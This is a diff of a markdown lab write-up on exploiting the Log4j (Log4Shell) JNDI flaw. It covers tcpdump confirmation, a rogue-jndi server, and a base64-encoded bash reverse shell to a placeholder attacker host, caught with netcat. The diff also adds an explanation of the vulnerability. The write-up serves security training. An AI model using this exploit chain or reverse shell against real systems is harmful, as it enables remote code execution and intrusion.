@@ -53,8 +53,7 @@ sudo tcpdump -i tun0 port 389
 # port: indicate the port where traffic is going to be captured. 
 ```
 
-The tcpdump output shows a connection being received on our machine. This proves that the application is
-indeed vulnerable since it is trying to connect back to us on the LDAP port 389.
+The tcpdump output shows a connection being received on our machine. This proves that the application is indeed vulnerable since it is trying to connect back to us on the LDAP port 389.
 
 ## Exploitation
 
@@ -69,7 +68,7 @@ cd rogue-jndi
 mvn package
 
 # Once it's build, make a reverse shell in base64 with attacker machine and listening port
-echo 'bash -c bash -i >&/dev/tcp/AtackerIP/AtackerPort 0>&1' | base64
+echo 'bash -c bash -i >&/dev/tcp/$AttackerIP/$AttackerPort 0>&1' | base64
 # This will return something similar to this: YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMi80NDQ0IDA+JjEK
  
 # Get out of rogue-jndi folder and
@@ -77,7 +76,7 @@ java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtY
 # In the bash command, copy paste your reverse shell in base64
 # --hostname: Victim IP
 
-# Now, open a terminal, launch [[netcat]] abd the listening port you defined in your payload.
+# Now, open a terminal, launch [[netcat]] and the listening port you defined in your payload.
 ```
 
 With Burpsuite, get a request for login:
@@ -131,7 +130,14 @@ Once we send that request, our jndi server will resend the reverse shell:
 
 And in our terminal with the nc listener we will get the reverse shell.
 
-The misinterpretation of the User-Agent leads to a JNDI lookup which is executed as a command from the system with administrator privileges and queries a remote server controlled by the attacker, which in our case is the `Destination` in our concept of attacks. This query requests a Java class created by the attacker and is manipulated for its own purposes. The queried Java code inside the manipulated Java class gets executed in the same process, leading to a remote code execution (`RCE`) vulnerability. GovCERT.ch has created an excellent graphical representation of the Log4j vulnerability worth examining in detail. Source: https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/
+
+## Dummy explanation
+
+Log4j is a framework or `Library` used to log application messages in Java and other programming languages. In this example, an attacker can manipulate the HTTP User-Agent header and insert a JNDI lookup as a command intended for the Log4j `library`. Accordingly, not the actual User-Agent header, such as Mozilla 5.0, is processed, but the JNDI lookup. What made the Log4j vulnerability so dangerous was the `Privileges` that the implementation brought. . Accordingly, most applications with the Log4j implementation were run with the privileges of an administrator. The process itself exploited the library by manipulating the User-Agent so that the process misinterpreted the source and led to the execution of user-supplied code.
+
+The misinterpretation of the User-Agent leads to a JNDI lookup which is executed as a command from the system with administrator privileges and queries a remote server controlled by the attacker.
+
+GovCERT.ch has created an excellent graphical representation of the Log4j vulnerability worth examining in detail. Source: https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/
 
 ![log4j](img/log4j_1.png)
 
